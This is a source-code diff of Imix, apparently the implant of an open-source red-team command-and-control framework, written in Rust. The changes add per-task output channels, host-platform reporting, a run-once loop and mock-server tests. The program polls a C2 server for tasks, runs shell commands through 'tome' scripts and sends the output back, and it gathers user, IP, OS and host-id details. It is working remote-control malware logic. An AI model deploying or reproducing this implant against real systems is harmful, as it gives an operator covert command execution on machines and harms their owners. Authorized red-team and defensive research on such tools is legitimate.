@@ -1,19 +1,26 @@
+use std::sync::mpsc::{channel, Sender, Receiver};
 use std::thread;
 use std::{collections::HashMap, fs};
 use std::fs::File;
 use std::io::Write;
 use std::path::Path;
 use std::time::Instant;
-use chrono::Utc;
+use chrono::{Utc, DateTime};
 use clap::{Command, arg};
 use anyhow::{Result, Error};
-use tokio::task;
+use tokio::task::{self, JoinHandle};
 use tokio::time::Duration;
 use imix::graphql::{GraphQLTask, self};
-use eldritch::eldritch_run;
+use eldritch::{eldritch_run,EldritchPrintHandler};
 use uuid::Uuid;
 use sys_info::{os_release,linux_os_release};
 
+pub struct ExecTask {
+    future_join_handle: JoinHandle<Result<(), Error>>,
+    start_time: DateTime<Utc>,
+    graphql_task: GraphQLTask,
+    print_reciever: Receiver<String>,
+}
 
 async fn install(config_path: String) -> Result<(), imix::Error> {
     let config_file = File::open(config_path)?;
@@ -29,8 +36,7 @@ async fn install(config_path: String) -> Result<(), imix::Error> {
 
     unimplemented!("The current OS/Service Manager is not supported")
 }
-
-async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
+async fn handle_exec_tome(task: GraphQLTask, print_channel_sender: Sender<String>) -> Result<(String,String)> {
     // TODO: Download auxillary files from CDN
 
     // Read a tome script
@@ -42,8 +48,11 @@ async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
     let tome_name = task_job.tome.name;
     let tome_contents = task_job.tome.eldritch;
 
+    let print_handler = EldritchPrintHandler{ sender: print_channel_sender };
+
+    println!("{:?}",task_job.parameters);
     // Execute a tome script
-    let res =  match thread::spawn(|| { eldritch_run(tome_name, tome_contents, task_job.tome.parameters) }).join() {
+    let res =  match thread::spawn(move || { eldritch_run(tome_name, tome_contents, task_job.parameters, &print_handler) }).join() {
         Ok(local_thread_res) => local_thread_res,
         Err(_) => todo!(),
     };
@@ -54,17 +63,15 @@ async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
     }
 }
 
-async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graphql::GraphQLTask) -> Result<(), Error> {
-    let start_time = Utc::now();
-
+async fn handle_exec_timeout_and_response(task: graphql::GraphQLTask, print_channel_sender: Sender<String>) -> Result<(), Error> {
     // Tasks will be forcebly stopped after 1 week.
     let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.
 
     // Define a future for our execution task
-    let exec_future = handle_exec_tome(task.clone());
+    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
 
     // Execute that future with a timeout defined by the timeout argument.
-    let tome_output = match tokio::time::timeout(timeout_duration, exec_future).await {
+    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
         Ok(res) => {
             match res {
                 Ok(tome_result) => tome_result,
@@ -74,20 +81,9 @@ async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graph
         Err(timer_elapsed) => ("".to_string(), format!("Time elapsed task {} has been running for {} seconds", task.id, timer_elapsed.to_string())),
     };
 
-    // Send task response
-    let task_response = graphql::GraphQLSubmitTaskResultInput {
-        task_id: task.id.clone(),
-        exec_started_at: start_time,
-        exec_finished_at: Some(Utc::now()),
-        output: tome_output.0.clone(),
-        error: tome_output.1.clone(),
-    };
-
-    let submit_task_result = graphql::gql_post_task_result(imix_callback_uri, task_response).await;
-    match submit_task_result {
-        Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
-        Err(error) => Err(error),
-    }
+    print_channel_sender.clone().send(format!("---[RESULT]----\n{}\n---------",tome_result.0))?;
+    print_channel_sender.clone().send(format!("---[ERROR]----\n{}\n--------",tome_result.1))?;
+    Ok(())
 }
 
 fn get_principal() -> Result<String> {
@@ -141,6 +137,18 @@ fn get_primary_ip() -> Result<String> {
     Ok(res)
 }
 
+fn get_host_platform() -> Result<String> {
+    if cfg!(target_os = "linux") {
+        return Ok("Linux".to_string());
+    } else if cfg!(target_os = "windows") {
+        return Ok("Windows".to_string());
+    } else if cfg!(target_os = "macos") {
+        return Ok("MacOS".to_string());
+    } else {
+        return Ok("Unknown".to_string());
+    }
+}
+
 fn get_os_pretty_name() -> Result<String> {
     if cfg!(target_os = "linux") {
         let linux_rel = linux_os_release()?;
@@ -157,13 +165,14 @@ fn get_os_pretty_name() -> Result<String> {
 }
 
 // Async handler for port scanning.
-async fn main_loop(config_path: String) -> Result<()> {
+async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
     let debug = true;
     let version_string = "v0.1.0";
     let config_file = File::open(config_path)?;
     let imix_config: imix::Config = serde_json::from_reader(config_file)?;
 
-    let mut all_exec_futures: HashMap<String, _> = HashMap::new();
+    // This hashmap tracks all jobs by their ID (key) and a tuple value: (future, channel_reciever)
+    let mut all_exec_futures: HashMap<String,  ExecTask> = HashMap::new();
 
     let principal = match get_principal() {
         Ok(username) => username,
@@ -195,6 +204,16 @@ async fn main_loop(config_path: String) -> Result<()> {
         },
     };
 
+    let host_platform = match get_host_platform() {
+        Ok(tmp_host_platform) => tmp_host_platform,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get host platform id\n{}", error));
+            }
+            "Unknown".to_string()
+        },
+    };
+
     let host_id = match get_host_id("/etc/system-id".to_string()) {
         Ok(tmp_host_id) => tmp_host_id,
         Err(error) => {
@@ -211,12 +230,13 @@ async fn main_loop(config_path: String) -> Result<()> {
         session_identifier: session_id,
         host_identifier: host_id,
         agent_identifier: format!("{}-{}","imix",version_string),
+        host_platform: host_platform,
     };
 
     loop {
         // 0. Get loop start time
         let loop_start_time = Instant::now();
-
+        if debug { println!("Get new tasks"); }
         // 1. Pull down new tasks
         // 1a) calculate callback uri
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
@@ -233,10 +253,19 @@ async fn main_loop(config_path: String) -> Result<()> {
             },
         };
 
+        if debug { println!("Starting {} new tasks", new_tasks.len()); }
         // 2. Start new tasks
         for task in new_tasks {
-            let exec_with_timeout = handle_exec_timeout_and_response(cur_callback_uri.clone(), task.clone());
-            match all_exec_futures.insert(task.clone().id, task::spawn(exec_with_timeout)) {
+            if debug { println!("Launching:\n{:?}", task.clone().job.unwrap().tome.eldritch); }
+
+            let (sender, receiver) = channel::<String>();
+            let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
+            match all_exec_futures.insert(task.clone().id, ExecTask{
+                future_join_handle: task::spawn(exec_with_timeout), 
+                start_time: Utc::now(), 
+                graphql_task: task.clone(), 
+                print_reciever: receiver,
+            }) {
                 Some(_old_task) => {
                     if debug {
                         println!("main_loop: error adding new task. Non-unique taskID\n");
@@ -246,28 +275,77 @@ async fn main_loop(config_path: String) -> Result<()> {
             }
         }
 
-
+        if debug { println!("Sleeping"); }
         // 3. Sleep till callback time
         //                                  time_to_wait          -         time_elapsed
         let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
         tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await;
 
-        // :clap: :clap: make new map!
-        let mut running_exec_futures: HashMap<String, _> = HashMap::new();
 
-        // Check status
+        // :clap: :clap: make new map!
+        let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();
+
+        if debug { println!("Checking status"); }
+        // Check status & send response
         for exec_future in all_exec_futures.into_iter() {
             if debug {
-                println!("{}: {:?}", exec_future.0, exec_future.1.is_finished());
+                println!("{}: {:?}", exec_future.0, exec_future.1.future_join_handle.is_finished());
             }
-            // Only re-insert the runnine exec futures
-            if !exec_future.1.is_finished() {
+            let mut res: Vec<String> = vec![];
+            loop {
+                if debug { println!("Reciveing output"); }
+                let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
+                    Ok(local_res_string) => local_res_string,
+                    Err(local_err) => {
+                        match local_err.to_string().as_str() {
+                            "channel is empty and sending half is closed" => { break; },
+                            _ => eprint!("Error: {}", local_err),
+                        }
+                        break;
+                    },
+                };
+                // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
+                res.push(new_res_line);
+                // Send task response
+            }
+            let task_response = match exec_future.1.future_join_handle.is_finished() {
+                true => {
+                    graphql::GraphQLSubmitTaskResultInput {
+                        task_id: exec_future.1.graphql_task.id.clone(),
+                        exec_started_at: exec_future.1.start_time,
+                        exec_finished_at: Some(Utc::now()),
+                        output: res.join("\n"),
+                        error: "".to_string(),
+                    }
+                },
+                false => {
+                    graphql::GraphQLSubmitTaskResultInput {
+                        task_id: exec_future.1.graphql_task.id.clone(),
+                        exec_started_at: exec_future.1.start_time,
+                        exec_finished_at: None,
+                        output: res.join("\n"),
+                        error: "".to_string(),
+                    }
+                },
+            };
+            if debug {
+                println!("{}", task_response.output);
+            }
+            let submit_task_result = graphql::gql_post_task_result(cur_callback_uri.clone(), task_response).await;
+            let _ = match submit_task_result {
+                Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
+                Err(error) => Err(error),
+            };
+
+                // Only re-insert the runnine exec futures
+            if !exec_future.1.future_join_handle.is_finished() {
                 running_exec_futures.insert(exec_future.0, exec_future.1);
             }
         }
 
         // change the reference! This is insane but okay.
         all_exec_futures = running_exec_futures;
+        if run_once { return Ok(()); };
     }
 }
 
@@ -313,7 +391,7 @@ pub fn main() -> Result<(), imix::Error> {
     }
 
     if let Some(config_path) = matches.value_of("config") {
-        match runtime.block_on(main_loop(config_path.to_string())) {
+        match runtime.block_on(main_loop(config_path.to_string(), false)) {
             Ok(_) => {},
             Err(error) => println!("Imix mail_loop exited unexpectedly with config: {}\n{}", config_path.to_string(), error),
         }
@@ -325,7 +403,10 @@ pub fn main() -> Result<(), imix::Error> {
 
 #[cfg(test)]
 mod tests {
+    use httptest::{Server, Expectation, matchers::{request}, responders::status_code, all_of};
+    use httptest::matchers::matches;
     use imix::{graphql::{GraphQLJob, GraphQLTome}};
+    use tempfile::NamedTempFile;
     use super::*;
 
     #[test]
@@ -359,24 +440,32 @@ mod tests {
                     id: "21474836482".to_string(),
                     name: "Shell execute".to_string(),
                     description: "Execute a command in the default system shell".to_string(),
-                    parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
                     eldritch: r#"
+print("custom_print_handler_test")
 sys.shell(input_params["cmd"])
 "#.to_string(),
                     files: [].to_vec(),
+                    param_defs: Some(r#"{"params":[{"name":"cmd","type":"string"}]}"#.to_string()),
                 },
+                parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
                 bundle: None,
             }),
         };
 
 
         let runtime = tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .unwrap();
+            .enable_all()
+            .build()
+            .unwrap();
 
+        let (sender, receiver) = channel::<String>();
 
-        let result = runtime.block_on(handle_exec_tome(test_tome_input)).unwrap();
+        // Define a future for our execution task
+        let exec_future = handle_exec_tome(test_tome_input, sender.clone());
+        let result = runtime.block_on(exec_future).unwrap();
+    
+        let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
+        assert_eq!(stdout, "custom_print_handler_test".to_string());
 
         println!("{:?}", result.clone());
         let mut bool_res = false;
@@ -396,6 +485,66 @@ sys.shell(input_params["cmd"])
 
         assert_eq!(bool_res, true);
 
+    }
+
+    #[test]
+    fn imix_test_main_loop_run_once() -> Result<()> {
+
+        // Response expectations are poped in reverse order.
+        let server = Server::run();
+        server.expect(
+            Expectation::matching(all_of![
+                request::method_path("POST", "/graphql"),
+                request::body(matches(".*ImixPostResult.*main_loop_test_success.*"))
+            ])
+            .times(1)
+            .respond_with(status_code(200)
+            .body(r#"{"data":{"submitTaskResult":{"id":"17179869185"}}}"#)),
+        );
+        server.expect(
+            Expectation::matching(all_of![
+                request::method_path("POST", "/graphql"),
+                request::body(matches(".*claimTasks.*"))
+            ])
+            .times(1)
+            .respond_with(status_code(200)
+            .body(r#"{"data":{"claimTasks":[{"id":"17179869185","job":{"id":"4294967297","name":"Exec stuff","parameters":"{\"cmd\":\"echo main_loop_test_success\"}","tome":{"id":"21474836482","name":"sys exec","description":"Execute system things.","paramDefs":"{\"paramDefs\":[{\"name\":\"cmd\",\"type\":\"string\"}]}","eldritch":"print(sys.shell(input_params[\"cmd\"]))","files":[]},"bundle":null}}]}}"#)),
+        );
+
+        let tmp_file_new = NamedTempFile::new()?;
+        let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
+        let url = server.url("/graphql").to_string();
+        let _ = std::fs::write(path_new.clone(),format!(r#"{{
+    "service_configs": [],
+    "target_forward_connect_ip": "127.0.0.1",
+    "target_name": "test1234",
+    "callback_config": {{
+        "interval": 8,
+        "jitter": 1,
+        "timeout": 4,
+        "c2_configs": [
+        {{
+            "priority": 1,
+            "uri": "{url}"
+        }}
+        ]
+    }}
+}}"#));
+
+        let runtime = tokio::runtime::Builder::new_current_thread()
+            .enable_all()
+            .build()
+            .unwrap();
+
+        // let (sender, receiver) = channel::<String>();
+
+        // // Define a future for our execution task
+        // let exec_future = handle_exec_tome(test_tome_input, sender.clone())
+        let exec_future = main_loop(path_new, true);
+        let _result = runtime.block_on(exec_future).unwrap();
+    
+        assert!(true);
+        Ok(())
     }
 }
 
